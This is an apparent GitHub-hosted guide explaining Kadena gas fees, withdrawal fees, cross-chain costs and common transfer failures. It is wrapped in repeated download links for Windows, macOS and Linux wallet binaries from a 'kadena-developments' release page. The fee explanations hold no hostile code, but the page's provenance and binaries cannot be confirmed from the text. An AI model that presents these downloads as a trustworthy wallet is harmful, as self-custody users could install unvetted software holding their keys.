![Kadena Wallet](assets/banner-article.png)

<h1 align="center">What a KDA Transaction Costs, and Why a Send Fails</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

"Fee" means three unrelated things in this ecosystem, and almost every confused conversation about cost is two people describing different ones. There is the charge the network makes for computation, the charge a venue makes for moving your balance out, and the charge a service makes for doing something on your behalf. Only the first is a protocol cost, and only the first is denominated in KDA.

Separating them explains most fee surprises, including the ones that look like the network overcharging.

## You'll see this if

- A transaction failed for insufficient funds while your balance looked adequate.
- A withdrawal fee at a venue seemed unrelated to what a transfer costs on-chain.
- You are trying to work out what a cross-chain transfer really costs.
- You want to know whether a failed transaction still charges you.

## Three fees, three payees

| Fee | Who charges it | What it pays for |
| --- | --- | --- |
| Network gas | The protocol, on the executing chain | Computation and storage for the transaction |
| Venue withdrawal fee | The exchange or service | Their operating cost, plus a margin |
| Service or bridge fee | A third-party tool | Whatever its operator decided to charge |

A venue's withdrawal fee is not the network's price. It is a commercial number, set by the venue, and it exists whether or not the underlying transfer is cheap. When someone says "Kadena fees are high because the exchange charged me", they are comparing a protocol cost with a business decision.

## What gas actually pays for

Every transaction executes somewhere: a chain, a block, a computation. Gas is the accounting for that computation, priced in KDA, and charged on the chain where the work happens.

Three consequences follow, and each one shows up as a support question.

**Gas is chain-local.** A balance on chain 0 cannot pay for a transaction on chain 4. If the wallet is pointed at one chain and the funds sit on another, the transaction has no way to settle.

**Work determines cost.** A plain transfer moves an amount between two existing accounts. Creating an account, calling contract logic or completing a cross-chain continuation all do more, and cost more as a result.

**Two operations cost twice.** A cross-chain transfer executes on the source chain and again on the destination. There is no combined price, because there is no combined transaction.

## Why the same send costs different amounts

Two transfers of the same size can differ in cost for reasons that have nothing to do with the amount.

- **Destination account state.** Sending to a name that already exists on the destination chain is one kind of operation. Sending to a name that has to be created is another, and the creation is part of the work being paid for.
- **Contract interaction.** A transfer executed by a contract runs more code than a direct transfer, and the extra code is metered.
- **The chain's own conditions.** Different chains carry different load, and a transaction's cost reflects what it asks the network to compute rather than a flat per-transfer price.

## Why a send fails

Failure messages are usually accurate and usually about one of four things.

| Symptom | Cause | What to check |
| --- | --- | --- |
| Insufficient funds | The paying chain has less than the transaction needs | Which chain the funds are on, and how much remains after the amount |
| Transaction refused | The transaction was rejected before or during execution | The reason string, then the account and chain |
| Nothing happens, no error | The node never accepted it | The endpoint, then whether a newer attempt is needed |
| Completed but no credit | The second half of a cross-chain transfer is missing | The destination chain, using the request key |

The first row is the one people argue with, because the wallet shows a healthy total. The total is across chains; the transaction pays from one. A balance screenshot is not evidence about the paying chain.

## A transaction can fail and still cost something

Inclusion is not the same as success. A transaction that is included in a block and then fails during execution has still consumed the computation the network performed, and the accounting reflects that.

This matters practically for two reasons. A repeatedly failing operation should be diagnosed rather than retried, because each attempt is a cost with no result. And a failed attempt does not mean the network lost the funds; it means the work was charged for and the effect was rolled back.

## Gas limits and gas prices

A transaction declares how much computation it is willing to pay for and at what price. The limit protects the sender from an operation that runs longer than expected; the price determines what the computation costs per unit.

Setting the limit too low produces a failure even when the balance is ample, because the transaction runs out of allowance before it finishes. Interfaces usually estimate this for you, and the estimate assumes an ordinary transaction rather than one that creates accounts or calls unusual logic.

## What this means for cross-chain transfers

A cross-chain transfer is the case where fee behaviour surprises people most, because it is two payments.

The source side pays to record the debit and produce a proof. The destination side pays to verify the proof and credit the account, including creation if the name is new. A wallet that quotes a single figure is quoting one of those, usually the first.

If a transfer is left half finished, the first payment has been made and the second has not. Completing it later means paying the second then, at whatever the conditions are at that point.

## Keeping costs predictable

- **Keep a small KDA balance on the chain you transact from.** Gas cannot be paid from a chain you are not on, and it cannot be paid in a token.
- **Avoid unnecessary hops.** Each cross-chain move is two payments; consolidating is cheaper than bouncing between chains.
- **Do not retry a failing transaction blindly.** Read the reason first, because the next attempt may fail identically and cost the same again.
- **Compare like with like.** A venue's withdrawal fee and a network fee are different categories, and comparing them produces a conclusion about the venue, not the chain.

## FAQ

**Can I pay a fee in a token other than KDA?**
No. Gas is denominated in the network's native asset, which is one reason a token-only balance cannot move.

**Does a failed transaction cost anything?**
If it was included and failed during execution, it consumed computation. If it was rejected before inclusion, there is nothing to charge.

**Why was my withdrawal fee higher than the on-chain cost?**
Because the venue set it. A withdrawal fee covers their operations and margin, not only the transaction it triggers.

**Is a cross-chain transfer charged twice?**
Yes, one payment on each side, since the proof has to be carried across.

**Why does the wallet say insufficient funds when I have KDA?**
The funds sit on a chain that is not the one settling the transaction, or too little is left after the amount you entered.

## Related reading

- Sending KDA from Kadena Wallet: four checks before you press send
- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Choosing a chain in Kadena Wallet: why balances differ
- Exchange deposit not showing? The chain mismatch behind it

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Legacy Accounts and k: Addresses: Why Both Still Exist](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/legacy-account-vs-k-address-in-kadena-wallet.md)
- [Multisig Accounts in Kadena Wallet: w: Keysets Explained](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-multisig-account-in-wallet.md)
- [What Kadena Wallet Is, and What Self-Custody Actually Means](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/what-is-kadena-wallet-self-custody.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
